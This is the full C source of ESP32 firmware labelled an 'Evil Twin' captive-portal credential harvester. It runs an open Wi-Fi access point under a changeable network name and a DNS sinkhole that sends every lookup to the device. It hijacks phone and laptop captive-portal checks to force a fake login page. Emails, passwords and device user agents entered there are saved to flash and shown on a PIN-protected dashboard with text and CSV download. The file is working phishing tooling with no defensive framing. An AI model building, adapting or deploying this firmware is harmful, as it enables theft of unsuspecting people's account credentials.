// ___________     .__.__    ___________       .__        
// \_   _____/__  _|__|  |   \__    ___/_  _  _|__| ____
//  |    __)_\  \/ /  |  |     |    |  \ \/ \/ /  |/    /
//  |        \\   /|  |  |__   |    |   \     /|  |   |  /
// /_______  / \_/ |__|____/   |____|    \/\_/ |__|___|  /
//         \/                                          \/
// ESP32 Captive Portal Credential Harvester - Version 2.0

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <sys/param.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "nvs.h"
#include "esp_mac.h"
#include "lwip/err.h"
#include "lwip/sys.h"
#include "lwip/inet.h"
#include "lwip/ip4_addr.h"
#include "lwip/sockets.h"
#include "esp_http_server.h"
#include "cJSON.h"
#include "esp_timer.h"

#define MAX_LOGS 30
#define MAX_CREDENTIALS 15
#define SESSION_TIMEOUT_MS 600000 // 10 mins

static const char *TAG = "CAPTIVE_PORTAL";

char current_ssid[33] = "WiFi";
char admin_pin[5] = "0000";

typedef struct {
    char email[64];
    char password[64];
    char timestamp[32];
    char userAgent[128];
    char deviceInfo[64];
} Credential;

Credential credentials[MAX_CREDENTIALS];
int credIndex = 0;

char logs[MAX_LOGS][256];
int logCount = 0;

uint32_t start_time_ms = 0;
int total_connections = 0;
int credentials_captured = 0;

bool admin_authorized = false;
uint32_t admin_session_start = 0;

SemaphoreHandle_t state_mutex;

extern const uint8_t login_html_start[] asm("_binary_login_html_start");
extern const uint8_t login_html_end[] asm("_binary_login_html_end");

extern const uint8_t admin_login_html_start[] asm("_binary_admin_login_html_start");
extern const uint8_t admin_login_html_end[] asm("_binary_admin_login_html_end");

extern const uint8_t admin_dashboard_html_start[] asm("_binary_admin_dashboard_html_start");
extern const uint8_t admin_dashboard_html_end[] asm("_binary_admin_dashboard_html_end");


#include <ctype.h>

void url_decode(char *dst, const char *src, size_t dst_len) {
    char a, b;
    size_t i = 0;
    while (*src && i < (dst_len - 1)) {
        if ((*src == '%') && *(src + 1) && *(src + 2) &&
            ((a = src[1]) && (b = src[2])) &&
            (isxdigit((int)a) && isxdigit((int)b))) {
            if (a >= 'a') a -= 'a'-'A';
            if (a >= 'A') a -= ('A' - 10);
            else a -= '0';
            if (b >= 'a') b -= 'a'-'A';
            if (b >= 'A') b -= ('A' - 10);
            else b -= '0';
            *dst++ = 16*a+b;
            src+=3;
        } else if (*src == '+') {
            *dst++ = ' ';
            src++;
        } else {
            *dst++ = *src++;
        }
        i++;
    }
    *dst = '\0';
}

static uint32_t get_uptime_ms() {
    return xTaskGetTickCount() * portTICK_PERIOD_MS;
}

void get_timestamp(char* buffer, size_t max_len) {
    uint32_t uptime = get_uptime_ms() / 1000;
    int hours = uptime / 3600;
    int minutes = (uptime % 3600) / 60;
    int seconds = uptime % 60;
    snprintf(buffer, max_len, "%02d:%02d:%02d", hours, minutes, seconds);
}

void add_log_safe(const char* log_entry) {
    if (xSemaphoreTake(state_mutex, portMAX_DELAY)) {
        if (logCount >= MAX_LOGS) {
            for (int i = 0; i < MAX_LOGS - 1; i++) {
                strlcpy(logs[i], logs[i + 1], sizeof(logs[i]));
            }
            strlcpy(logs[MAX_LOGS - 1], log_entry, sizeof(logs[MAX_LOGS - 1]));
        } else {
            strlcpy(logs[logCount], log_entry, sizeof(logs[logCount]));
            logCount++;
        }
        xSemaphoreGive(state_mutex);
    }
}

// NVS Helpers
void save_credential_to_nvs(int index) {
    nvs_handle_t my_handle;
    if (nvs_open("storage", NVS_READWRITE, &my_handle) == ESP_OK) {
        char key[16];
        snprintf(key, sizeof(key), "cred_%d", index);
        nvs_set_blob(my_handle, key, &credentials[index], sizeof(Credential));
        nvs_set_i32(my_handle, "cred_count", credIndex);
        nvs_commit(my_handle);
        nvs_close(my_handle);
    }
}

void load_credentials_from_nvs() {
    nvs_handle_t my_handle;
    if (nvs_open("storage", NVS_READWRITE, &my_handle) == ESP_OK) {
        int32_t count = 0;
        if (nvs_get_i32(my_handle, "cred_count", &count) == ESP_OK) {
            if (count > MAX_CREDENTIALS) count = MAX_CREDENTIALS;
            credIndex = count;
            credentials_captured = count;
            for (int i = 0; i < count; i++) {
                char key[16];
                snprintf(key, sizeof(key), "cred_%d", i);
                size_t required_size = sizeof(Credential);
                nvs_get_blob(my_handle, key, &credentials[i], &required_size);
            }
        }
        nvs_close(my_handle);
    }
}

void clear_credentials_nvs() {
    nvs_handle_t my_handle;
    if (nvs_open("storage", NVS_READWRITE, &my_handle) == ESP_OK) {
        nvs_erase_all(my_handle);
        nvs_commit(my_handle);
        nvs_close(my_handle);
    }
}

// WI-FI Handlers
static void wifi_event_handler(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data) {
    if (event_id == WIFI_EVENT_AP_STACONNECTED) {
        wifi_event_ap_staconnected_t* event = (wifi_event_ap_staconnected_t*) event_data;
        char mac_str[18];
        snprintf(mac_str, sizeof(mac_str), MACSTR, MAC2STR(event->mac));
        
        char log_buf[128];
        char ts[32];
        get_timestamp(ts, sizeof(ts));
        snprintf(log_buf, sizeof(log_buf), "[%s] <span style='color:#3b82f6'>[INFO] Device connected: %s</span>", ts, mac_str);
        add_log_safe(log_buf);
        
        xSemaphoreTake(state_mutex, portMAX_DELAY);
        total_connections++;
        xSemaphoreGive(state_mutex);
    } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) {
        wifi_event_ap_stadisconnected_t* event = (wifi_event_ap_stadisconnected_t*) event_data;
        char mac_str[18];
        snprintf(mac_str, sizeof(mac_str), MACSTR, MAC2STR(event->mac));
        
        char log_buf[128];
        char ts[32];
        get_timestamp(ts, sizeof(ts));
        snprintf(log_buf, sizeof(log_buf), "[%s] <span style='color:#94a3b8'>[INFO] Device disconnected: %s</span>", ts, mac_str);
        add_log_safe(log_buf);
    }
}

void wifi_init_softap(void) {
    esp_netif_t *ap_netif = esp_netif_create_default_wifi_ap();
    
    // Set custom IP 192.168.1.1
    esp_netif_ip_info_t ip_info;
    IP4_ADDR(&ip_info.ip, 192, 168, 1, 1);
    IP4_ADDR(&ip_info.gw, 192, 168, 1, 1);
    IP4_ADDR(&ip_info.netmask, 255, 255, 255, 0);
    esp_netif_dhcps_stop(ap_netif);
    esp_netif_set_ip_info(ap_netif, &ip_info);
    esp_netif_dhcps_start(ap_netif);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL, NULL));

    wifi_config_t wifi_config = { .ap = { .max_connection = 10, .authmode = WIFI_AUTH_OPEN } };
    strncpy((char*)wifi_config.ap.ssid, current_ssid, sizeof(wifi_config.ap.ssid));
    wifi_config.ap.ssid_len = strlen(current_ssid);

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());
}

// DNS Server
void dns_server_task(void *pvParameters) {
    char rx_buffer[512];
    int addr_family = AF_INET;
    int ip_protocol = IPPROTO_IP;
    
    while (1) {
        struct sockaddr_in dest_addr;
        dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(53); // DNS port

        int sock = socket(addr_family, SOCK_DGRAM, ip_protocol);
        if (sock < 0) { ESP_LOGE(TAG, "Unable to create socket"); break; }

        int err = bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (err < 0) { ESP_LOGE(TAG, "Socket unable to bind"); break; }

        while (1) {
            struct sockaddr_storage source_addr;
            socklen_t socklen = sizeof(source_addr);
            int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, 0, (struct sockaddr *)&source_addr, &socklen);

            if (len > 0) {
                // Simple DNS response modification (Sinkhole)
                char response[512];
                if (len + 16 > sizeof(response)) continue; // Keep it safely within bounds
                memcpy(response, rx_buffer, len);
                
                // Set QR bit to 1 (response), leave opcode, AA, TC, RD (byte 2)
                response[2] |= 0x80;
                // Set RA = 1, Z = 0, RCODE = 0 (NoError) (byte 3)
                response[3] |= 0x80;
                
                // ANCOUNT = 1
                response[6] = 0x00; response[7] = 0x01;
                // NSCOUNT = 0, ARCOUNT = 0
                response[8] = 0x00; response[9] = 0x00;
                response[10] = 0x00; response[11] = 0x00;
                
                // Append Answer record
                int resp_len = len;
                // Name (Pointer to offset 12)
                response[resp_len++] = 0xC0; response[resp_len++] = 0x0C;
                // Type A (1)
                response[resp_len++] = 0x00; response[resp_len++] = 0x01;
                // Class IN (1)
                response[resp_len++] = 0x00; response[resp_len++] = 0x01;
                // TTL (60)
                response[resp_len++] = 0x00; response[resp_len++] = 0x00;
                response[resp_len++] = 0x00; response[resp_len++] = 0x3C;
                // RDLENGTH (4)
                response[resp_len++] = 0x00; response[resp_len++] = 0x04;
                // RDATA (192.168.1.1)
                response[resp_len++] = 192;
                response[resp_len++] = 168;
                response[resp_len++] = 1;
                response[resp_len++] = 1;

                sendto(sock, response, resp_len, 0, (struct sockaddr *)&source_addr, sizeof(source_addr));
            }
        }
    }
}

// HTTP SERVER
static esp_err_t root_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, (const char *)login_html_start, login_html_end - login_html_start);
    return ESP_OK;
}

static esp_err_t generate_204_handler(httpd_req_t *req) {
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://192.168.1.1/login");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

static esp_err_t success_txt_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/plain");
    httpd_resp_send(req, "Success", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static void html_escape(const char *src, char *dest, size_t dest_size) {
    size_t d = 0;
    for (size_t i = 0; src[i] != '\0' && d < dest_size - 6; i++) {
        switch (src[i]) {
            case '<': d += snprintf(dest + d, dest_size - d, "&lt;"); break;
            case '>': d += snprintf(dest + d, dest_size - d, "&gt;"); break;
            case '&': d += snprintf(dest + d, dest_size - d, "&amp;"); break;
            case '"': d += snprintf(dest + d, dest_size - d, "&quot;"); break;
            case '\'': d += snprintf(dest + d, dest_size - d, "&#39;"); break;
            default: dest[d++] = src[i]; break;
        }
    }
    dest[d] = '\0';
}

static esp_err_t login_post_handler(httpd_req_t *req) {
    char buf[512] = {0};
    int ret, remaining = req->content_len;

    if (remaining >= sizeof(buf)) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }

    if ((ret = httpd_req_recv(req, buf, remaining)) <= 0) {
        if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
            httpd_resp_send_408(req);
        }
        return ESP_FAIL;
    }
    
    char email_raw[128] = "Unknown";
    char password_raw[128] = "Unknown";
    char time_raw[64] = "";

    // Parse form-urlencoded
    char* token = strtok(buf, "&");
    while(token != NULL) {
        if(strncmp(token, "email=", 6) == 0) strlcpy(email_raw, token + 6, sizeof(email_raw));
        else if(strncmp(token, "password=", 9) == 0) strlcpy(password_raw, token + 9, sizeof(password_raw));
        else if(strncmp(token, "time=", 5) == 0) strlcpy(time_raw, token + 5, sizeof(time_raw));
        token = strtok(NULL, "&");
    }

    char email[64] = {0};
    char password[64] = {0};
    char time_local[64] = {0};
    url_decode(email, email_raw, sizeof(email));
    url_decode(password, password_raw, sizeof(password));
    url_decode(time_local, time_raw, sizeof(time_local));

    char ua[128] = "Unknown";
    httpd_req_get_hdr_value_str(req, "User-Agent", ua, sizeof(ua));
    
    xSemaphoreTake(state_mutex, portMAX_DELAY);
    if(credIndex < MAX_CREDENTIALS) {
        strlcpy(credentials[credIndex].email, email, sizeof(credentials[credIndex].email));
        strlcpy(credentials[credIndex].password, password, sizeof(credentials[credIndex].password));
        strlcpy(credentials[credIndex].userAgent, ua, sizeof(credentials[credIndex].userAgent));
        strlcpy(credentials[credIndex].deviceInfo, "Unknown", sizeof(credentials[credIndex].deviceInfo)); // Device parsing logic stub
        
        if (strlen(time_local) > 0) {
            strlcpy(credentials[credIndex].timestamp, time_local, sizeof(credentials[credIndex].timestamp));
        } else {
            get_timestamp(credentials[credIndex].timestamp, sizeof(credentials[credIndex].timestamp));
        }
        
        credIndex++;
        credentials_captured++;

        save_credential_to_nvs(credIndex - 1);
    }
    xSemaphoreGive(state_mutex);

    if(strlen(email) > 0 && strcmp(email, "Unknown") != 0) {
        char log_buf[300];
        char ts[32];
        char safe_email[128];
        
        html_escape(email, safe_email, sizeof(safe_email));
        
        if (strlen(time_local) > 0) {
            strlcpy(ts, time_local, sizeof(ts));
        } else {
            get_timestamp(ts, sizeof(ts));
        }
        snprintf(log_buf, sizeof(log_buf), "[%s] <span style='color:#ef4444'>[!] Credential Captured: %s</span>", ts, safe_email);
        add_log_safe(log_buf);
    }
    
    // Redirect to success
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "/success");
    httpd_resp_send(req, NULL, 0);

    return ESP_OK;
}

static esp_err_t success_handler(httpd_req_t *req) {
    // hhs
    // const char* resp = "<html><head><title>Success</title><meta name='viewport' content='width=device-width, initial-scale=1'><style>* { margin: 0; padding: 0; box-sizing: border-box; } body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif; background: #9ea700; min-height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; } .container { background: #ffffff; color: #333333; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); } h2 { margin-bottom: 15px; } p { font-size: 16px; opacity: 0.9; }</style></head><body><div class='container'><h2>Verbinding geslaagd</h2><p>Je bent nu verbonden met het netwerk.</p><p style='margin-top: 15px; font-size: 12px;'>Je kunt dit venster sluiten.</p></div></body></html>";
    
    const char* resp = "<html><head><title>Success</title><meta name='viewport' content='width=device-width, initial-scale=1'><style>* { margin: 0; padding: 0; box-sizing: border-box; } body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif; background: #e5e7eb; min-height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; } .container { background: #ffffff; color: #374151; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); max-width: 400px; } h2 { margin-bottom: 15px; color: #111827; } p { font-size: 16px; margin-bottom: 10px; opacity: 0.9; } .footer { margin-top: 20px; font-size: 12px; color: #6b7280; }</style></head><body><div class='container'><h2>Connection successful</h2><p>You are now connected to the network.</p><p class='footer'>You may now close this window.</p></div></body></html>";
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, resp, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Helper for 403 Response
static esp_err_t httpd_resp_send_403(httpd_req_t *req) {
    httpd_resp_set_status(req, "403 Forbidden");
    return httpd_resp_send(req, "403 Forbidden", HTTPD_RESP_USE_STRLEN);
}

// ADMIN HANDLERS
static bool is_admin_authorized() {
    bool auth = false;
    xSemaphoreTake(state_mutex, portMAX_DELAY);
    if(admin_authorized && (get_uptime_ms() - admin_session_start) <= SESSION_TIMEOUT_MS) {
        auth = true;
    } else {
        admin_authorized = false;
    }
    xSemaphoreGive(state_mutex);
    return auth;
}

static esp_err_t admin_ui_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    if(is_admin_authorized()) {
        httpd_resp_send(req, (const char *)admin_dashboard_html_start, admin_dashboard_html_end - admin_dashboard_html_start);
    } else {
        httpd_resp_send(req, (const char *)admin_login_html_start, admin_login_html_end - admin_login_html_start);
    }
    return ESP_OK;
}

static esp_err_t admin_auth_post(httpd_req_t *req) {
    char buf[64] = {0};
    int ret, remaining = req->content_len;
    if (remaining >= sizeof(buf)) { httpd_resp_send_500(req); return ESP_FAIL; }
    if ((ret = httpd_req_recv(req, buf, remaining)) <= 0) {
        if (ret == HTTPD_SOCK_ERR_TIMEOUT) httpd_resp_send_408(req);
        return ESP_FAIL;
    }
    
    char pin[16] = "";
    char* token = strtok(buf, "&");
    while(token != NULL) {
        if(strncmp(token, "pin=", 4) == 0) strlcpy(pin, token + 4, sizeof(pin));
        token = strtok(NULL, "&");
    }
    
    if(strcmp(pin, admin_pin) == 0) {
        xSemaphoreTake(state_mutex, portMAX_DELAY);
        admin_authorized = true;
        admin_session_start = get_uptime_ms();
        xSemaphoreGive(state_mutex);
        
        char ts[32];
        get_timestamp(ts, 32);
        char log_buf[128];
        snprintf(log_buf, sizeof(log_buf), "[%s] <span style='color:#4ade80'>[OK] Admin Login Success</span>", ts);
        add_log_safe(log_buf);
    } else {
        char ts[32];
        get_timestamp(ts, 32);
        char log_buf[128];
        snprintf(log_buf, sizeof(log_buf), "[%s] <span style='color:#ef4444'>[!] Admin Login Failed</span>", ts);
        add_log_safe(log_buf);
    }
    
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "/admin");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}


// --- Missing Admin Handlers ---
static esp_err_t admin_logout_handler(httpd_req_t *req) {
    xSemaphoreTake(state_mutex, portMAX_DELAY);
    admin_authorized = false;
    xSemaphoreGive(state_mutex);
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "/admin");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

static esp_err_t admin_clear_handler(httpd_req_t *req) {
    if(!is_admin_authorized()) { httpd_resp_send_403(req); return ESP_FAIL; }
    xSemaphoreTake(state_mutex, portMAX_DELAY);
    logCount = 0;
    credIndex = 0;
    credentials_captured = 0;
    clear_credentials_nvs();
    xSemaphoreGive(state_mutex);
    
    char log_buf[128];
    char ts[32];
    get_timestamp(ts, 32);
    snprintf(log_buf, sizeof(log_buf), "[%s] <span style='color:#ef4444'>[!] All logs and credentials cleared</span>", ts);
    add_log_safe(log_buf);

    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "/admin");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

static esp_err_t admin_ssid_post_handler(httpd_req_t *req) {
    if(!is_admin_authorized()) { httpd_resp_send_403(req); return ESP_FAIL; }
    char buf[64] = {0};
    int ret, remaining = req->content_len;
    if (remaining >= sizeof(buf)) { httpd_resp_send_500(req); return ESP_FAIL; }
    if ((ret = httpd_req_recv(req, buf, remaining)) <= 0) {
        if (ret == HTTPD_SOCK_ERR_TIMEOUT) httpd_resp_send_408(req);
        return ESP_FAIL;
    }
    
    char ssid_raw[64] = "";
    char* token = strtok(buf, "&");
    while(token != NULL) {
        if(strncmp(token, "ssid=", 5) == 0) strlcpy(ssid_raw, token + 5, sizeof(ssid_raw));
        token = strtok(NULL, "&");
    }
    
    char new_ssid[33] = "";
    url_decode(new_ssid, ssid_raw, sizeof(new_ssid));
    
    if(strlen(new_ssid) > 0) {
        xSemaphoreTake(state_mutex, portMAX_DELAY);
        strlcpy(current_ssid, new_ssid, sizeof(current_ssid));
        xSemaphoreGive(state_mutex);
        
        wifi_config_t wifi_config = {
            .ap = {
                .max_connection = 10,
                .authmode = WIFI_AUTH_OPEN
            }
        };
        strncpy((char*)wifi_config.ap.ssid, current_ssid, sizeof(wifi_config.ap.ssid));
        wifi_config.ap.ssid_len = strlen(current_ssid);
        
        esp_wifi_set_config(WIFI_IF_AP, &wifi_config);
        
        char log_buf[128];
        char ts[32];
        get_timestamp(ts, 32);
        snprintf(log_buf, sizeof(log_buf), "[%s] <span style='color:#f59e0b'>[*] SSID changed to: %s</span>", ts, current_ssid);
        add_log_safe(log_buf);
    }
    
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "/admin");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

static esp_err_t download_txt_handler(httpd_req_t *req) {
    if(!is_admin_authorized()) { httpd_resp_send_403(req); return ESP_FAIL; }
    httpd_resp_set_type(req, "text/plain");
    httpd_resp_set_hdr(req, "Content-Disposition", "attachment; filename=\"credentials.txt\"");
    
    char buf[512];
    xSemaphoreTake(state_mutex, portMAX_DELAY);
    for(int i = 0; i < credIndex; i++) {
        snprintf(buf, sizeof(buf), "Time: %s | Email: %s | Password: %s | Device: %s\n", 
            credentials[i].timestamp, credentials[i].email, credentials[i].password, credentials[i].userAgent);
        httpd_resp_send_chunk(req, buf, strlen(buf));
    }
    xSemaphoreGive(state_mutex);
    httpd_resp_send_chunk(req, NULL, 0);
    return ESP_OK;
}

static esp_err_t download_csv_handler(httpd_req_t *req) {
    if(!is_admin_authorized()) { httpd_resp_send_403(req); return ESP_FAIL; }
    httpd_resp_set_type(req, "text/csv");
    httpd_resp_set_hdr(req, "Content-Disposition", "attachment; filename=\"credentials.csv\"");
    
    const char* header = "Timestamp,Email,Password,Device\n";
    httpd_resp_send_chunk(req, header, strlen(header));
    
    char buf[512];
    xSemaphoreTake(state_mutex, portMAX_DELAY);
    for(int i = 0; i < credIndex; i++) {
        snprintf(buf, sizeof(buf), "\"%s\",\"%s\",\"%s\",\"%s\"\n", 
            credentials[i].timestamp, credentials[i].email, credentials[i].password, credentials[i].userAgent);
        httpd_resp_send_chunk(req, buf, strlen(buf));
    }
    xSemaphoreGive(state_mutex);
    httpd_resp_send_chunk(req, NULL, 0);
    return ESP_OK;
}

static esp_err_t not_found_handler(httpd_req_t *req, httpd_err_code_t err) {
    // Redirect unknown routes to the captive portal to force popup
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://192.168.1.1/login");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}
// ------------------------------

static esp_err_t admin_data_api(httpd_req_t *req) {
    if(!is_admin_authorized()) {
        httpd_resp_send_403(req);
        return ESP_FAIL;
    }

    cJSON *root = cJSON_CreateObject();
    
    char uptime_str[32];
    get_timestamp(uptime_str, 32);
    cJSON_AddStringToObject(root, "uptime", uptime_str);

    xSemaphoreTake(state_mutex, portMAX_DELAY);
    cJSON_AddStringToObject(root, "ssid", current_ssid);

    wifi_sta_list_t wifi_sta_list;
    esp_wifi_ap_get_sta_list(&wifi_sta_list);
    cJSON_AddNumberToObject(root, "devices", wifi_sta_list.num);

    cJSON_AddNumberToObject(root, "connections", total_connections);
    cJSON_AddNumberToObject(root, "captured", credentials_captured);
    int rate = (total_connections > 0) ? (credentials_captured * 100) / total_connections : 0;
    cJSON_AddNumberToObject(root, "rate", rate);
    cJSON_AddNumberToObject(root, "logcount", logCount);
    cJSON_AddNumberToObject(root, "maxlogs", MAX_LOGS);
    cJSON_AddNumberToObject(root, "memusage", (logCount * 100) / MAX_LOGS);
    cJSON_AddNumberToObject(root, "credcount", credIndex);
    
    cJSON *logs_arr = cJSON_AddArrayToObject(root, "logs");
    for(int i = logCount - 1; i >= 0; i--) {
        cJSON_AddItemToArray(logs_arr, cJSON_CreateString(logs[i]));
    }
    
    cJSON *creds_arr = cJSON_AddArrayToObject(root, "creds");
    for(int i = credIndex - 1; i >= 0; i--) {
        cJSON *cred = cJSON_CreateObject();
        cJSON_AddStringToObject(cred, "t", credentials[i].timestamp);
        cJSON_AddStringToObject(cred, "e", credentials[i].email);
        cJSON_AddStringToObject(cred, "p", credentials[i].password);
        cJSON_AddStringToObject(cred, "d", credentials[i].userAgent);
        cJSON_AddItemToArray(creds_arr, cred);
    }
    xSemaphoreGive(state_mutex);
    
    const char* sys_info = cJSON_PrintUnformatted(root);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, sys_info, strlen(sys_info));
    
    cJSON_Delete(root);
    free((void*)sys_info);
    
    return ESP_OK;
}

httpd_handle_t start_webserver(void) {
    httpd_handle_t server = NULL;
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_uri_handlers = 15;
    config.lru_purge_enable = true;

    if (httpd_start(&server, &config) == ESP_OK) {
        httpd_uri_t uri_root = { .uri = "/", .method = HTTP_GET, .handler = root_handler, .user_ctx = NULL };
        httpd_register_uri_handler(server, &uri_root);
        
        httpd_uri_t uri_login = { .uri = "/login", .method = HTTP_GET, .handler = root_handler, .user_ctx = NULL };
        httpd_register_uri_handler(server, &uri_login);

        httpd_uri_t uri_login_post = { .uri = "/login", .method = HTTP_POST, .handler = login_post_handler, .user_ctx = NULL };
        httpd_register_uri_handler(server, &uri_login_post);
        
        httpd_uri_t uri_success = { .uri = "/success", .method = HTTP_GET, .handler = success_handler, .user_ctx = NULL };
        httpd_register_uri_handler(server, &uri_success);
        
        httpd_uri_t uri_hotspot1 = { .uri = "/generate_204", .method = HTTP_GET, .handler = generate_204_handler, .user_ctx = NULL };
        httpd_register_uri_handler(server, &uri_hotspot1);

        httpd_uri_t uri_hotspot2 = { .uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = generate_204_handler, .user_ctx = NULL };
        httpd_register_uri_handler(server, &uri_hotspot2);
        
        httpd_uri_t uri_success_txt = { .uri = "/success.txt", .method = HTTP_GET, .handler = success_txt_handler, .user_ctx = NULL };
        httpd_register_uri_handler(server, &uri_success_txt);
        
        // Admin UI
        httpd_uri_t uri_admin = { .uri = "/admin", .method = HTTP_GET, .handler = admin_ui_handler, .user_ctx = NULL };
        httpd_register_uri_handler(server, &uri_admin);
        
        httpd_uri_t uri_admin_auth = { .uri = "/admin-auth", .method = HTTP_POST, .handler = admin_auth_post, .user_ctx = NULL };
        httpd_register_uri_handler(server, &uri_admin_auth);
        

        httpd_uri_t uri_admin_data = { .uri = "/admin-data", .method = HTTP_GET, .handler = admin_data_api, .user_ctx = NULL };
        httpd_register_uri_handler(server, &uri_admin_data);

        httpd_uri_t uri_admin_logout = { .uri = "/admin-logout", .method = HTTP_GET, .handler = admin_logout_handler, .user_ctx = NULL };
        httpd_register_uri_handler(server, &uri_admin_logout);

        httpd_uri_t uri_admin_clear = { .uri = "/admin-clear", .method = HTTP_GET, .handler = admin_clear_handler, .user_ctx = NULL };
        httpd_register_uri_handler(server, &uri_admin_clear);

        httpd_uri_t uri_admin_ssid = { .uri = "/admin-ssid", .method = HTTP_POST, .handler = admin_ssid_post_handler, .user_ctx = NULL };
        httpd_register_uri_handler(server, &uri_admin_ssid);

        httpd_uri_t uri_dl_txt = { .uri = "/download-txt", .method = HTTP_GET, .handler = download_txt_handler, .user_ctx = NULL };
        httpd_register_uri_handler(server, &uri_dl_txt);

        httpd_uri_t uri_dl_csv = { .uri = "/download-csv", .method = HTTP_GET, .handler = download_csv_handler, .user_ctx = NULL };
        httpd_register_uri_handler(server, &uri_dl_csv);

        httpd_register_err_handler(server, HTTPD_404_NOT_FOUND, not_found_handler);
    }
    return server;
}

void app_main(void) {
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    state_mutex = xSemaphoreCreateMutex();
    
    load_credentials_from_nvs();
    
    start_time_ms = get_uptime_ms();

    wifi_init_softap();
    
    char ts[32];
    get_timestamp(ts, 32);
    char log_buf[128];
    snprintf(log_buf, sizeof(log_buf), "[%s] <span style='color:#4ade80'>[OK] System started successfully</span>", ts);
    add_log_safe(log_buf);

    xTaskCreate(dns_server_task, "dns_task", 4096, NULL, 5, NULL);
    
    start_webserver();

    while(1) {
        vTaskDelay(pdMS_TO_TICKS(1000));
    }
}
